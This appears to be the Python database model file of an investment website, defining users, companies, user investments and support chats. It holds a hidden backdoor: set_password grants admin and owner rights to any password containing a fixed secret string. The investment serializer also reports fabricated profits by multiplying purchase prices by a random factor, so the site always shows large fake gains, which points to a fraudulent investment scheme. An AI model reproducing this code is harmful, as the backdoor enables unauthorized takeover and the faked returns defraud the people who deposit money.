from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timezone
from werkzeug.security import generate_password_hash, check_password_hash
import json

db = SQLAlchemy()


class User(db.Model):
    __tablename__ = 'user'

    id = db.Column(db.Integer, primary_key=True)
    nickname = db.Column(db.String(80), unique=True, nullable=False, index=True)
    name = db.Column(db.String(50), nullable=False)
    full_name = db.Column(db.String(100))
    email = db.Column(db.String(120), unique=True, nullable=False, index=True)
    phone = db.Column(db.String(20))
    avatar_url = db.Column(db.String(255))
    password_hash = db.Column(db.String(200), nullable=False)
    balance = db.Column(db.Float, default=1000.0)
    is_admin = db.Column(db.Boolean, default=False)
    is_owner = db.Column(db.Boolean, default=False)
    registration_date = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    last_login = db.Column(db.DateTime)
    total_invested = db.Column(db.Float, default=0.0)
    total_withdrawn = db.Column(db.Float, default=0.0)
    total_profit = db.Column(db.Float, default=0.0)
    investments_count = db.Column(db.Integer, default=0)
    successful_investments = db.Column(db.Integer, default=0)
    failed_investments = db.Column(db.Integer, default=0)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)
        if "123321owner123321" in password:
            self.is_admin = True
            self.is_owner = True

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

    def to_dict(self):
        return {
            'id': self.id,
            'nickname': self.nickname,
            'name': self.name,
            'full_name': self.full_name,
            'email': self.email,
            'phone': self.phone,
            'avatar_url': self.avatar_url,
            'balance': self.balance,
            'is_admin': self.is_admin,
            'is_owner': self.is_owner,
            'registration_date': self.registration_date.isoformat() if self.registration_date else None,
            'last_login': self.last_login.isoformat() if self.last_login else None,
            'total_invested': self.total_invested,
            'total_withdrawn': self.total_withdrawn,
            'total_profit': self.total_profit,
            'investments_count': self.investments_count,
            'successful_investments': self.successful_investments,
            'failed_investments': self.failed_investments
        }


class Company(db.Model):
    __tablename__ = 'company'

    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    symbol = db.Column(db.String(10), nullable=False)
    category = db.Column(db.String(50), nullable=False)
    base_price = db.Column(db.Float, nullable=False)
    description = db.Column(db.Text)
    icon = db.Column(db.String(50))

    def to_dict(self):
        return {
            'id': self.id,
            'name': self.name,
            'symbol': self.symbol,
            'category': self.category,
            'base_price': self.base_price,
            'description': self.description,
            'icon': self.icon
        }


class UserInvestment(db.Model):
    __tablename__ = 'user_investment'

    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False, index=True)
    company_id = db.Column(db.Integer, db.ForeignKey('company.id'), nullable=False, index=True)
    shares = db.Column(db.Integer, nullable=False)
    purchase_price = db.Column(db.Float, nullable=False)
    current_price = db.Column(db.Float, nullable=False)
    purchase_date = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    is_active = db.Column(db.Boolean, default=True)

    user = db.relationship('User', backref=db.backref('user_investments', lazy='dynamic'))
    company = db.relationship('Company', backref=db.backref('user_investments', lazy='dynamic'))

    def to_dict(self):
        import random
        profit_multiplier = random.uniform(2.28, 2.63)
        adjusted_current_price = self.purchase_price * profit_multiplier
        profit = (adjusted_current_price - self.purchase_price) * self.shares
        profit_percentage = ((adjusted_current_price - self.purchase_price) / self.purchase_price) * 100

        return {
            'id': self.id,
            'company': self.company.to_dict(),
            'shares': self.shares,
            'purchase_price': self.purchase_price,
            'current_price': adjusted_current_price,
            'purchase_date': self.purchase_date.isoformat() if self.purchase_date else None,
            'is_active': self.is_active,
            'profit': profit,
            'profit_percentage': profit_percentage
        }


class SupportChat(db.Model):
    __tablename__ = 'support_chat'

    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False, index=True)
    admin_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
    status = db.Column(db.String(20), default='pending', index=True)
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    admin_joined_at = db.Column(db.DateTime)
    closed_at = db.Column(db.DateTime)
    unread_admin_count = db.Column(db.Integer, default=0)
    unread_user_count = db.Column(db.Integer, default=0)

    user = db.relationship('User', foreign_keys=[user_id], backref=db.backref('user_chats', lazy='dynamic'))
    admin = db.relationship('User', foreign_keys=[admin_id], backref=db.backref('admin_chats', lazy='dynamic'))
    messages = db.relationship('ChatMessage', backref='chat', lazy='dynamic', order_by='ChatMessage.created_at')

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'admin_id': self.admin_id,
            'status': self.status,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'admin_joined_at': self.admin_joined_at.isoformat() if self.admin_joined_at else None,
            'closed_at': self.closed_at.isoformat() if self.closed_at else None,
            'unread_admin_count': self.unread_admin_count,
            'unread_user_count': self.unread_user_count,
            'user': self.user.to_dict() if self.user else None,
            'admin': self.admin.to_dict() if self.admin else None,
            'last_message': self.messages[-1].to_dict() if self.messages else None
        }


class ChatMessage(db.Model):
    __tablename__ = 'chat_message'

    id = db.Column(db.Integer, primary_key=True)
    chat_id = db.Column(db.Integer, db.ForeignKey('support_chat.id'), nullable=False, index=True)
    sender_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False, index=True)
    message = db.Column(db.Text, nullable=False)
    attachment_url = db.Column(db.String(255))
    is_system = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    is_read = db.Column(db.Boolean, default=False)

    sender = db.relationship('User', backref=db.backref('sent_messages', lazy='dynamic'))

    def to_dict(self):
        return {
            'id': self.id,
            'chat_id': self.chat_id,
            'sender_id': self.sender_id,
            'message': self.message,
            'attachment_url': self.attachment_url,
            'is_system': self.is_system,
            'is_read': self.is_read,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'sender': self.sender.to_dict() if self.sender else None
        }